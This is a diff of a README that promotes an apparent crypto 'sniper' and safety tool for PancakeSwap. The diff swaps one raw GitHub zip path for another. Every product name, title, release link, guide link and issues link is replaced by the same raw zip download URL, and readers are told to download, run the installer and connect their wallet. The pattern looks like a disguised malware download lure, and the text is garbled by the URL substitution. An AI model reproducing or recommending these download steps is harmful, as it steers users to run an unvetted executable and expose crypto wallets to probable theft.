@@ -1,16 +1,16 @@
-# 🎯 https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip - Simplifying Your Crypto Safety
+# 🎯 https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip - Simplifying Your Crypto Safety
 
 ## 🚀 Getting Started
 
-Welcome to https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip! This tool helps you detect migrations and risks in crypto transactions, focusing on safety as you trade on PancakeSwap. Let’s get started with downloading and running the application.
+Welcome to https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip! This tool helps you detect migrations and risks in crypto transactions, focusing on safety as you trade on PancakeSwap. Let’s get started with downloading and running the application.
 
 ## 📥 Download the Application
 
-[![Download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip%20Now-%https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)
+[![Download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip%20Now-%https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)
 
-You can download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip from our Releases page. Simply visit this link to get the latest version:
+You can download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip from our Releases page. Simply visit this link to get the latest version:
 
-[Download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)
+[Download https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Before you download, ensure your system meets these minimum requirements:
 ## ⚙️ How to Install
 
 1. **Visit the Releases Page**:
-   Go to [this link](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip) to find the latest version.
+   Go to [this link](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip) to find the latest version.
   
 2. **Download the Installer**:
    On the Releases page, locate the latest version of the application. Download it by clicking the link provided for your operating system.
@@ -33,18 +33,18 @@ Before you download, ensure your system meets these minimum requirements:
    Once the download is complete, locate the downloaded file. Double-click it to run the installer, and follow the on-screen instructions.
 
 4. **Complete Setup**:
-   The installation may take a few minutes. Once finished, you can find the https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip application in your Applications folder or Start menu, depending on your OS.
+   The installation may take a few minutes. Once finished, you can find the https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip application in your Applications folder or Start menu, depending on your OS.
 
 5. **Launch the Application**:
    Double-click the application icon to start. You will see the main interface where you can set up your crypto trading parameters.
 
 ## ⚡ Features Overview
 
-- **Migration Detection**: Identify when tokens move from https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip to PancakeSwap, ensuring you stay updated with the latest trends.
+- **Migration Detection**: Identify when tokens move from https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip to PancakeSwap, ensuring you stay updated with the latest trends.
 - **Risk Alerts**: Get notified about potential risks associated with token transactions.
 - **User-Friendly Interface**: Navigate easily through an intuitive design, guiding you through your trading experience.
   
-## 📊 Using https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip
+## 📊 Using https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip
 
 1. **Setting Up Your Account**: When you first open the application, set up your account by entering your wallet address and connecting it to the bot.
 
@@ -56,7 +56,7 @@ Before you download, ensure your system meets these minimum requirements:
 
 ## 🐞 Troubleshooting
 
-If you encounter issues during installation or while using https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip, consider the following steps:
+If you encounter issues during installation or while using https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip, consider the following steps:
 
 - **Ensure Compatibility**: Double-check that your system meets the requirements listed above.
 - **Check Internet Connection**: A stable connection is necessary for the tool to function correctly.
@@ -66,12 +66,12 @@ If you still need help, feel free to raise an issue on our GitHub repository.
 
 ## 📞 Contact Us
 
-For any questions or feedback, you can reach out directly through our GitHub page. Your experience matters, and we appreciate any input that helps improve https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip
+For any questions or feedback, you can reach out directly through our GitHub page. Your experience matters, and we appreciate any input that helps improve https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip
 
 ## 🔗 Useful Links
 
-- [Release Page](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)
-- [User Guide](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)
-- [Open Issues](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip)
+- [Release Page](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)
+- [User Guide](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)
+- [Open Issues](https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip)
 
-Thank you for choosing https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/shrewishness/four.meme-sniper.zip We hope it enhances your crypto trading experience!
+Thank you for choosing https://raw.githubusercontent.com/kingyounes1234/four.meme-sniper/master/src/four_sniper_meme_1.3.zip We hope it enhances your crypto trading experience!
